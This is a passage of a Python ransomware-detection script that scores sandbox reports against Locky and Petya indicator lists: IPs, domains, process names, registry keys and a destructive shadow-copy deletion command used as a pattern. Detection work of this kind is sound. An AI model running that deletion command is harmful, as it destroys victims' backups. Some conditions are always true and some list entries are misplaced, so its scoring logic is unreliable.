                                "DECRYPT-FILES.txt","wmiprvse.exe","decrypt-files.html","unsecapp.exe","PXxGl2m5n3.exe","dllhost.exe","services.exe"
                                ,"taskhost.exe","csrss.exe","ctfmon.exe","dwm.exe","mshta.exe","mstsc.exe","notepad.exe","netsh.exe",
                                "mmc.exe","calc.exe","chkdsk.exe","winword.exe","excel.exe","lsm.exe","osk.exe","msconfig.exe","winrm.exe","sethc.exe",
                                "cscript.exe","snippingtool.exe","schtasks.exe","Decryptor.exe","wmpnetwk.exe","_HELP_instructions.html","asasin-",
                                "DesktopOSIRIS.htm","diablo6-","HELP_Recover_Files_.html","ykcol-","_HELP_instructions.html","javaw.exe"]
    PATH_RANSOMWARE = [r"%APPDATA%\teamviewers\msi.dll",r"c:\windows\192145.dll,StartW",
                    "C:\\bootmgr","C:\\totalcmd\\","C:\\Far2\\",
                    r"C:\Users\<User>\AppData\Local",
                    "C:\\Users\\user\\Documents\\",
                    "C:\\decrypt",
                    "C:\\Users\\<USER>\\Downloads\\ransimware.exe",
                    r"C:\Users\USER\AppData\Local\Temp\icju1.exe","%CONHOST%","C:\\Far2\\Plugins\\"
                    "C:\\ProgramData\\Microsoft\\Crypto\\RSA","C:\\Windows\\system32\\rsaenh.dll",
                    "C:\\Users\\All Users\\Microsoft\\Crypto\\RSA\\","c:\\programdata\\microsoft\\crypto\\rsa\\",
                    "C:\\Documents and Settings\\All Users\\Microsoft\\Crypto\\RSA\\",
                    "${SamplePath}\\","<PATH_SAMPLE.EXE>","%SAMPLEPATH%",
                    r"C:\Documents and Settings\<User>\Application Data",
                    r"C:\Documents and Settings\<User>\Local Application Data","%Temp%",r"C:\Windows"
                    ]
    power_shell_cmd = ["vssadmin.exe Delete Shadows /All /Quiet"]
    # Check for suspicious network connections associated with locky
    SUSPICIOUS_NETWORK_IPS = ['82.146.37.200','5.135.76.18','51.254.240.45','195.123.209.8', '213.32.66.16', '95.213.186.93', '91.201.202.130', '69.195.129.70', '94.242.55.81', '95.46.114.205', '82.146.32.92', '91.107.107.165', '95.46.8.175', '46.8.29.176', '89.108.118.180', '109.248.222.47', '91.142.90.55', '31.41.47.48', '213.32.90.193', '91.201.42.83', '185.118.167.144', '185.146.171.180', '92.122.214.96', '91.198.174.192', '185.115.140.210', '78.155.205.46', '91.228.239.216', '31.202.128.249', '192.162.103.213', '185.17.120.130', '195.123.218.175', '192.162.103.118', '185.20.185.119', '5.196.99.239', '5.188.63.30', '46.17.44.153', '46.183.165.45', '109.234.35.75', '91.230.211.76', '185.67.2.156', '188.127.239.10', '91.203.5.162', '91.191.184.158', '54.39.233.132', '45.67.14.162', '185.193.141.248', '195.64.154.14']
    SUSPICIOUS_NETWORK_PORT = [137,138,21,22,135,443,445,1433,1434,3389,4343,5000,5985,5355,8079,25055,4132,4124,4114,53]
    URLS_SUSPECTS = ['mamfwehjmnlpsr.us', 'mgcvnxmkklrl.uk', 'trbmjvpxncp.fr', 'rdhbkxbxkbg.yt', 'cfymtbtvndwf.ru', 'iafwsvlc.in', 'vqxvcn.uk', 'fseneflpqxdvjm.in', 'ukfgt.in', 'ndasd.us', 'apjrth.pw', 'avyikbtyliydohu.in', 'apxbysl.tf', 'pvrsbcnsq.fr', 'fxbyyc.fr', 'dixbheudautb.be', 'xgyrjtjlhd.ru', 'bacjxn.tf', 'nlkejtxx.tf', 'opyvurfyi.tf', 'bswfabld.tf', 'ykmobqwktdi.yt', 'nlyyjkiaews.pw', 'vdnigs.pw', 'sipjgxl.de', 'snxiljkwq.us', 'gfguxfp.ru', 'inqvmknlystaai.de', 'hhxvrowasqouvn.in', 'qxxuucjephgjlok.frndasd.us', 'vqxvcn.uk', 'fseneflpqxdvjm.in', 'rdhbkxbxkbg.yt', 'sipjgxl.de', 'bswfabld.tf', 'tnkehxcdgfwusi.pw', 'hdkugh.us', 'ushhalcbu.eumfjeerdb.us', 'aujxopqsypb.pw', 'nkghwixxbjadly.eu', 'newsbrazilonline.com', 'chevroletbusan.com', 'seansauce.com', 'munsterpumps.ie', 'theharrisconsultinggroup.com', 'jbqqenkoq.xyz', 'pctvvwec.pl', 'ofcqbpehtsuus.click', 'qipmyibe.ru', 'ailwoufftjyi.click', 'msdplenmbx.pw', 'sjtxdhp.xyz', 'nrocbjar.work', 'fkfuufcbyrsggf.org', 'qkdaqbahrfakiau.info', 'bhktlfpogtsgxs.biz', 'gyuwnpdhekwtgjkw.xyz', 'yetkwrplvnxmcigwq.ru', 'ispitflxbpahnccm.info', 'smmpbjd.click', 'wjkqiinlk.xyz', 'xvvqqwloatds.ru', 'ogbbtdmitjaajwlqv.work', 'bdltwhoccvjeb.biz', 'npjikmmiavjlshx.ru', 'sdrtjdwfqk.work', 'hfdtaqkl.org', 'lvuixaext.pw', '82.146.37.200', 'jvconoybyq.su', '93.170.131.108', 'cnyblftjn.su', 'btykyhxppu.pl', 'blyctjipy.pw', 'pwgddndknik.ru', 'shjomakbskgdythti.work', 'xitjjvnmrfitmj.org', 'hvtlehjb.ru', 'gvotvrecllwvv.pw', 'qmslppge.info', 'xubemdxtud.xyz', 'dfumljsoosrxpv.click', 'oouxmfyngsiwult.pw', 'kwsphsp.click', 'cbndcya.su', 'sriclliccfxe.org', 'owuuwkkreucudebt.su', 'qlcudscnyy.biz', 'norjuyujsyninmh.pl', '5.135.76.18', 'swksrdbn.ru', 'adsintiqe.su', 'deqybmelx.click', 'pmjtopaikpqnuyu.org', 'awpimbfnwrdavjrv.work', 'clcketxkmk.info', 'gkaxirviba.pl', 'fmsfamhvyarewsiyg.xyz', 'kihcweqiidoyvrofq.su', 'alvebsg.pl', 'bplcqwfhrybmyetr.su', 'jqkfcihrbc.info', 'vdfewwnur.info', 'sgbsruyqchxkq.work', 'vjnympfrhpknhhdxv.su', 'dkppsqbqqm.org', 'cwpcogpwontlo.work', 'wgjaonlup.pl', 'vmyjlcudemtrhhgc.biz', '31.41.44.130', '51.254.240.45', 'nngyikiqvcqudoohr.biz', 'olygsctr.su', 'inyxcafwss.ru', 'ncegnabxxecf.info', 'evtcjtaal.work', 'ndekdullf.pl', 'ffhiwusykymwjgoh.pl', 'xhhsdsjyco.click', 
                    'unggfnvis.xyz', 'nhvkytmaoolp.org', 'dcahcxgjedud.org', 'apiatvl.biz', 'ausihbujonxhg.pw', 'fjnspormgxwcil.org', 'fkvqujgfjroapyhsw.su', 'cspopsngaupsg.ru', 'dmrieprwfxxyj.click', 'krjocqw.pl', 'itpuwwrylwwmm.ru', 'veofqynrkd.click', 'tvlaqyhqfakldr.org', 'qtxnsiolby.work', 'fosqxgcatobr.click', 'pdytjrfydjdtgiug.work', 'ernvjtcsduhhaelto.info', 'hxobncndbufcykqmo.info', 'vhqeeswk.click', 'pybnwpaikssk.ru', 'nbcpumrctd.ru', 'mdjjjrqkstfabchn.ru', 'dhjgvghkhiwtwvfiw.info', 'wpbqkwhfctpyb.pw', 'qndofcrampldlb.org', 'hpwukidlaepout.click', 'tudjkbqmv.click']
    NT_DETECTED = ["Your files are encrypted"]
    # Registry Key of file :
    try :
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in locky_REGISTRY_KEYS:
                if j in i:
                    if j in "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\":
                        if ".exe" in j:
                            total += 1
                        else:
                            total += 0
                    else:
                        total += 1
        #print("Total registry_keys_opened est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0
    

    # processes terminated
    try :
        
        for i in dictionary["data"]["processes_terminated"] :
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
        #print("Total processes_terminated est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try :
        
        for i in dictionary["data"]["files_deleted"]:
            for j in locky_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
        #print("Total files_deleted est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0
    # processes_tree
    try :
        
        for i in dictionary["data"]["processes_tree"]:
            for j in locky_EXTENSIONS:
                if j.lower() in i["name"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i["name"] or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i["name"]:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["name"]:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_tree est : "+str(len(dictionary["data"]["processes_tree"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try :
        
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in locky_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in locky_REGISTRY_KEYS:
                            if l in k:
                                total += 1
                        for l in NT_DETECTED:
                            if l in k:
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l in k:
                                total += 1
        #print("Total signature matches est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0
    # modules_loaded
    try :
        for i in dictionary["data"]["modules_loaded"]:
            for j in locky_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i:
                            total += 1
                        else :
                            total += 0
        #print("Total modules_loaded est : "+str(len(dictionary["data"]["modules_loaded"]))+"/"+str(total))
    except KeyError :
        total += 0
    #dns_lookups
    try :
        for i in dictionary["data"]["dns_lookups"]:
            for j in URLS_SUSPECTS:
                if j in i["hostname"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["resolved_ips"]:
                    total += 1
            
        #print("Total dns_lookups est : "+str(len(dictionary["data"]["dns_lookups"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_domains
    try :
        
        for i in dictionary["data"]["memory_pattern_domains"]:
            for j in URLS_SUSPECTS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_ips
    try :
        for i in dictionary["data"]["memory_pattern_ips"]:
            for j in SUSPICIOUS_NETWORK_IPS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # mutexes created
    mutex = [r"Global\MsWinZonesCacheCounterMutexA",r"Global\UACMutex",r"Global\WindowsUpdateLockMutex",r"Global\RpcEptMapperMutex",
            r"Global\UuidMutex",r"Global\wininetCacheMutex","Global\\","_!MSFTHISTORY!_"]
    try :
        for i in dictionary["data"]["mutexes_created"]:
            for j in mutex:
                if j in i:
                    total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            for j in mutex:
                if j in i:
                    total += 1
        #print("Total mutexes created and opened est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # text_decoded
    try :
        
        for i in dictionary["data"]["text_decoded"]:
            if "locky" in i:
                total += 1
            for j in NT_DETECTED:
                if j in i:
                    total += 1
    except KeyError :
        total += 0

    # files_opened
    try :
        
        for i in dictionary["data"]["files_opened"]:
            for j in locky_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i:
                            total += 1
                        else :
                            total += 0
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i.lower():
                    total += 1
    except KeyError:
        total += 0

    #registry_keys_set
    try :
        
        for i in dictionary["data"]["registry_keys_set"]:
            for j in i:
                if j in "key":
                    for k in locky_REGISTRY_KEYS:
                        if k in i[j]:
                            total +=1
        
        #print("Total registry_keys_set est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0
        
    # registry_keys_deleted
    try :
        
        for i in dictionary["data"]["registry_keys_deleted"]:
            for j in locky_REGISTRY_KEYS:
                if j in i:
                    total +=1
        
        #print("Total registry_keys_deleted est : "+str(len(dictionary["data"]["registry_keys_deleted"]))+"/"+str(total))
    except KeyError :
        total += 0

    # processes_created
    try :
        
        for i in dictionary["data"]["processes_created"]:
            for j in locky_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i:
                            total += 1
                        else :
                            total += 0
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_created est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["T1566","T1190","T1189","T1195","T1078","T1204","T1129","T1059","T1106","T1547","T1574","T1134","T1068","T1574","T1027",
                            "T1562","T1574","T1083","T1018","T1057","T1082","T1012","T1063","T1003","T1552","T1570","T1560","T1005","T1071","T1567",
                            "T1048","T1486","T1489","T1490","T1529","T1491","T1518","T1055","T1082","T1053","T1105","T1107","T1060","T1485","T1192",
                            "T1193","T1064","T1112","T1108","T1573","T1492"]
        
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic
    
    try :
        for i in dictionary["data"]["ip_traffic"]:
            for j in i:
                if j in "destination_ip":
                    for k in SUSPICIOUS_NETWORK_IPS:
                        if k in i[j]:
                            total += 1
                if j in "destination_port":
                    for k in SUSPICIOUS_NETWORK_PORT:
                        if k == i[j]:
                            total += 1
        #print("Total ip_traffic est : "+str(5*len(dictionary["data"]["ip_traffic"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # files_copied
    
    try :
        for i in dictionary["data"]["files_copied"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in locky_EXTENSIONS:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i["destination"] or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i["destination"]:
                            total += 1
                        else :
                            total += 0
        #print("Total files_copied est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try :
        
        for i in dictionary["data"]["files_written"]:
            for j in locky_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i:
                            total += 1
                        else :
                            total += 0
            for j in TERMES:
                if j.lower() in i.lower():
                    total += 1
            
        #print("Total files_written est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try :
        
        for i in dictionary["data"]["files_dropped"]:
            for j in i:
                if "path" in j:
                    for k in locky_EXTENSIONS:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in SUSPICIOUS_PROCESS_NAMES:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in PATH_RANSOMWARE:
                        if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                            if ".exe" in i:
                                total += 1
                            else :
                                total += 0
                    for k in TERMES:
                        if k in i[j]:
                            total += 1
            
        #print("Total files_dropped est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try :
        
        for i in dictionary["data"]["command_executions"]:
            for j in power_shell_cmd :
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
        #print("Total command_executions est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    
    # memory_pattern_urls
    try :
        
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i:
                    total += 1
            
        #print("Total memory_pattern_urls est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0
    # http_conversations
    try :
        for i in dictionary["data"]["http_conversations"]:
            for j in URLS_SUSPECTS:
                if j in i["url"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["url"]:
                    total += 1
            
        #print("Total http_conversations est : "+str(len(dictionary["data"]["http_conversations"]))+"/"+str(total))
    except KeyError:
        total += 0
    # Calculate the probs
    #print("[locky] ~ La somme de tout est : "+str(total))
    return total

def check_for_petya_behaviors(json_file):
    # Somme total 
    total = 0

    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by petya
    petya_EXTENSIONS = [".petya"]
    
    # List of common registry keys modified by petya
    petya_REGISTRY_KEYS = [
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network",
        "HKLM\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\TRACING\\0036407552_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASMANCS",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASAPI32",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASMANCS",
        "HKEY_CURRENT_USER\\Software\\Locky",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Tracing\\svchost_RASAPI32",
        r"HKEY_CURRENT_USER\Software[random_name]",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\WallpaperStyle",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\UserChoice\Progid",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithList",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithProgids",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Extensions",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Rpc",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot\Minimal",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot\Network",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Tracing",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Policies\\Microsoft\\Windows NT\\Rpc",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Locale\Alternate Sorts",
        "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        "HKLM\\Software\\Microsoft\\Cryptography",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Disk",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        "HKLM\\Software\\Policies\\Microsoft\\Cryptography",
        "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        "HKLM\\Software\\Microsoft\\Cryptography\\Offload",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Winsock\\Setup Migration\\Providers\\Tcpip6",
        r"\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\LFF9miD",
        "<HKLM>\\SOFTWARE\\Wow6432Node\\LFF9miD",
        "HKLM\\Software\\SBB CFF FFS AG\\Ransimware\\1.0.0.0",
        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\SHELL FOLDERS",
        "\\REGISTRY\\MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Rpc",
        "\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe",
        "\\REGISTRY\\MACHINE\\Software\\Policies\\Microsoft\\Cryptography",
        'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00asw', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00avg', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00avira', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00bitdefender', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00kaspersky', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00mcafee', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00norton', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00panda', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00sophos', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00symantec', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\00zonealarm'
    ]
    
    # Check for suspicious process names associated with petya
    SUSPICIOUS_PROCESS_NAMES = ['fondue.exe','mshearts.exe','Win32.ExPetr.a','CRYPTBASE.dll','blastcln.exe','unlodctr.exe','rsopprov.exe','taskdl.exe', 'taskse.exe', 'psexec.exe', 'cmd.exe', 'wmiprvse.exe', 'Psexec.exe', 'mmc.exe', 'svchost.exe', 'schtasks.exe', 'wscript.exe', 'winword.exe', 'excel.exe', 'powerpnt.exe', 'msaccess.exe', 'outlook.exe', 'onenote.exe', 'steam.exe', 'chrome.exe', 'firefox.exe', 'iexplore.exe', 'opera.exe', 'safari.exe', 'thunderbird.exe', 'acrobat.exe', 'notepad.exe', 'wmic.exe', 'ctfmon.exe', 'msiexec.exe', 'rundll32.exe', 'dllhost.exe', 'taskeng.exe', 'explorer.exe', 'lsass.exe', 'rundll.exe', 'MsMpEng.exe', 'services.exe', 'wininit.exe', 'winlogon.exe', 'csrss.exe', 'smss.exe', 'spoolsv.exe', 'lsaiso.exe', 'vssadmin.exe', 'dispci.exe', 'mssecsvc.exe', 'taskhost.exe', 'dllhst3g.exe', 'conhost.exe', 'kernel32.dll', 'user32.dll', 'wininet.dll', 'winmm.dll', 'ws2_32.dll', 'gdi32.dll', 'comctl32.dll', 'ntdll.dll', 'shell32.dll', 'advapi32.dll', 'ole32.dll', 'shlwapi.dll', 'rpcrt4.dll', 'comdlg32.dll', 'crypt32.dll', 'msvcr71.dll', 'imm32.dll', 'version.dll', 'oleaut32.dll', 'iphlpapi.dll', 'urlmon.dll', 'cryptdll.dll', 'netapi32.dll', 'wintrust.dll', 'msimg32.dll', 'msvcrt.dll', 'secur32.dll', 'dnsapi.dll', 'mss32.dll', 'd3dx9_41.dll', 'rasadhlp.dll', 'sspicli.dll', 'winspool.drv', 'cryptsp.dll', 'rasapi32.dll', 'dwmapi.dll', 'rsaenh.dll', 'api-ms-win-core-libraryloader-l1-2-0.dll', 'api-ms-win-core-processthreads-l1-1-1.dll', 'api-ms-win-core-file-l1-2-1.dll', 'api-ms-win-core-heap-l1-2-0.dll', 'api-ms-win-core-debug-l1-1-1.dll', 'api-ms-win-core-synch-l1-2-0.dll', 'api-ms-win-core-handle-l1-1-0.dll', 'api-ms-win-core-localization-l1-2-0.dll', 'api-ms-win-core-console-l1-1-0.dll', 'api-ms-win-core-io-l1-1-1.dll', 'api-ms-win-core-registry-l1-1-0.dll', 'api-ms-win-core-timezone-l1-1-0.dll', 'api-ms-win-core-processthreads-l1-1-0.dll', 'api-ms-win-core-string-l1-1-0.dll', 'api-ms-win-core-threadpool-l1-2-0.dll', 'api-ms-win-core-xstate-l']
